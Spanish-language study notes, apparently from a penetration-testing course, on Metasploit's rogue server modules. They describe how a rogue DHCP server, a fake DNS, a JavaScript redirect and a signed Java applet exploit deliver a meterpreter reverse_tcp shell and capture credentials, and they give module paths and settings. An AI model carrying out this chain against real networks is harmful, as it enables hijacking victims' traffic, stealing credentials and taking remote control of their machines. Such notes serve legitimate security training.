SERVIDORES ROGUE
--------------------

	-> Metasploit dispone de módulos que permiten levantar un servidor en menos de un minuto donde alojar un servicio web malicioso.

	-> Con ello se consigue desde redirigir la máquina víctima hasta un servicio donde espera un puerto para inyectar el Payload hasta la posibilidad ejecutar varios servicios

	-> Los módulos se encuentran en auliary/server y los tipos son:

	       	- ftp
		- http
		- smb
		- pop3
		- smtp
		- telnet
		- ...

         -> Todos permiten obtener credenciales de autenticación


Ejemplo: Rogue DHCP, Fake DNS, applet de Java
----------------------------------------------

--> Para inyectar de forma remota un payload en la víctima:

1) Crear un servicio rogue dhcp que asigna una dirección IP dentro de un rango elegido por el atacante.

2) Crearemos un servicio fake DNS para que cuando la víctima acceda a una página web, el servidor falso DNS le redirija a una página alojada en la máquina del atacante donde habrá un applet de Java que inyectará un payload cuando la víctima lo acepte.

--> Configuración del Rogue DHCP

 - DHCPIPEND: 192.168.1.105 --> Dirección máxima
 - DHCPIPSTART: 192.168.1.100  --> Dirección mínima
 - DNSSERVER: Dirección IP donde se encuentra el DNS (en el ejemplo, 192.168.0.61)
 - NETMASK: 255.255.255.0
 - ROUTER: Dirección IP de la puerta de enlace, en este caso, también el ataccante por si interesara monitorizar el tráfico y capturar cookies y credenciales
 - SRVHOST: Dirección IP donde está el servidor DNS, también la máquina del atacante en el ejemplo.

--> Configuración del fake DNS

    - Está en auxiliary/server/fakedns
    - Opciones:
      - DOMAINBYPASS: Lista de sitios para los que las resoluciones no serán falseadas
      - SRVHOST: Dirección IP del servidor DNS
      - Puerto:

    - Ejemplo: cuando una víctima acceda a www.apple.com, el servidor DNS falso resuelve la petición devolviendo la dirección IP de la máquina atacante. Entonces la víctima se encuentra una una página con un index.html donde habrá un script como

<script type="text/javascript"> window.location = "http://www.apple.com:8080/portal" </script> <!--Arbitrary redirect -->

--> Configuration del applet de Java

    - Alojado en exploit/multi/browser/java_signed_applet
    - Configuración:
      - SRVHOST: 192.168.0.61
      - SRVPORT: 8080 (PUerto a la escucha)
      - URIPATH: /portal
      - PAYLOAD: Windows/meterpreter/reverse_tcp
